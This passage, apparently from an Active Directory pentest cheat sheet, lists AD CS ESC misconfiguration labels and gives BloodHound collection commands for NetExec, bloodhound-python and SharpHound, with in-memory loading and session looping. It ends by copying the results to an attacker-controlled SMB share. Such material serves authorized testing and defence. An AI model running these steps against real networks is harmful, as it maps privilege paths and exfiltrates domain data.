| Client Authentication EKU | Can be useful for authentication. |
| Enrollee supplies subject | Subject/SAN control. |
| Manager approval | Whether approval is required. |
| Authorized signatures | Signature requirements. |
| Template ACL | Who can modify the template. |

**Common ESC labels to recognize**

| Label | General meaning |
| --- | --- |
| ESC1 | Misconfigured template allows requester-controlled subject with client auth. |
| ESC2 | Any Purpose or broad EKU usage. |
| ESC3 | Certificate Request Agent path. |
| ESC4 | Template ACL abuse. |
| ESC6 | CA-level subject alternative name behavior. |
| ESC7 | CA permission abuse. |
| ESC8 | NTLM relay to AD CS web enrollment. |
| ESC9/ESC10 | Mapping / strong certificate binding related paths. |
| ESC13 | Issuance policy group link path. |



---

## BloodHound Collection

BloodHound collection turns AD relationships into graph data.

BloodHound is useful because AD privilege paths often depend on multiple relationships that are hard to see manually.

This section focuses on collecting data from Linux or with built-in collectors.

**NetExec BloodHound collector**

Basic collection:

```bash
nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN --bloodhound --collection All
```

With DNS server:

```bash
nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN --bloodhound --collection All --dns-server $DC_IP
```

With Kerberos:

```bash
nxc ldap $DC_HOST -u $USER -p "$PASS" -d $DOMAIN -k --bloodhound --collection All --dns-server $DC_IP
```

Common output:

```text
bloodhound_*.json
*.zip
```

**bloodhound-python**

Basic:

```bash
bloodhound-python -u $USER -p "$PASS" -d $DOMAIN -ns $DC_IP -c All
```

Specify DC:

```bash
bloodhound-python -u $USER -p "$PASS" -d $DOMAIN -dc $DC_HOST -ns $DC_IP -c All
```

Kerberos:

```bash
bloodhound-python -u $USER -k -d $DOMAIN -dc $DC_HOST -ns $DC_IP -c All
```

Useful collection methods:

| Method | Meaning |
| --- | --- |
| `Default` | Common default collection set. |
| `Group` | Group membership. |
| `LocalAdmin` | Local admin relationships. |
| `Session` | User sessions. |
| `Trusts` | Domain trusts. |
| `ACL` | AD object permissions. |
| `ObjectProps` | Object properties. |
| `Container` | OU/container relationships. |
| `All` | Broad collection. |

**When to use BloodHound collection**

| Situation | Use |
| --- | --- |
| New valid domain user | Initial graph collection. |
| Need group nesting clarity | Group collection. |
| Looking for ACL paths | ACL collection. |
| Hunting sessions | Session collection. |
| Multi-domain environment | Trust collection. |
| Need broad lab data | All collection. |

**Import**

BloodHound CE usually imports ZIP files produced by collectors.

Keep collection output organized:

```bash
mkdir -p bh/$DOMAIN
mv *.json *.zip bh/$DOMAIN/ 2>/dev/null
```


---

## SharpHound Collection

SharpHound is the official Windows collector for BloodHound CE.

It is commonly used when running collection from a domain-joined Windows host.

**Basic SharpHound usage**

From PowerShell:

```powershell
.\SharpHound.exe -c All
```

Specify domain:

```powershell
.\SharpHound.exe -c All -d corp.local
```

Specify domain controller:

```powershell
.\SharpHound.exe -c All -d corp.local --domaincontroller dc01.corp.local
```

Output directory:

```powershell
.\SharpHound.exe -c All --OutputDirectory C:\Windows\Temp
```

Zip output is created by default in many SharpHound builds.

**Common collection methods**

```powershell
.\SharpHound.exe -c Default
.\SharpHound.exe -c Group
.\SharpHound.exe -c Session
.\SharpHound.exe -c LocalAdmin
.\SharpHound.exe -c ACL
.\SharpHound.exe -c Trusts
.\SharpHound.exe -c ObjectProps
.\SharpHound.exe -c Container
.\SharpHound.exe -c All
```

Combined methods:

```powershell
.\SharpHound.exe -c Group,LocalAdmin,Session,Trusts,ACL,ObjectProps
```

Stealthier style collection depends on scope and rules of engagement. In labs, `All` is usually acceptable.

**Run from memory**

If the environment allows PowerShell loading:

```powershell
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All
```

Specify output:

```powershell
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Windows\Temp
```

**Useful options**

| Option | Purpose |
| --- | --- |
| `-c` / `--collectionmethods` | Select collection methods. |
| `-d` / `--domain` | Specify domain. |
| `--domaincontroller` | Use specific DC. |
| `--OutputDirectory` | Where to write output. |
| `--ZipFileName` | Name output ZIP. |
| `--NoSaveCache` | Avoid saving cache. |
| `--Loop` | Repeated session collection. |
| `--LoopDuration` | Loop duration. |
| `--LoopInterval` | Delay between loop iterations. |

**Session loop example**

```powershell
.\SharpHound.exe -c Session --Loop --LoopDuration 01:00:00 --LoopInterval 00:05:00
```

Use looping only when allowed, because it increases collection activity.

**Copy output**

Example output:

```text
20260101120000_BloodHound.zip
```

Copy from Windows host:

```powershell
copy .\*_BloodHound.zip C:\Windows\Temp\
```

If SMB is available from attacker box:

```bash
smbserver.py share . -smb2support
```

Then from Windows:

```cmd
copy *_BloodHound.zip \\ATTACKER_IP\share\
```
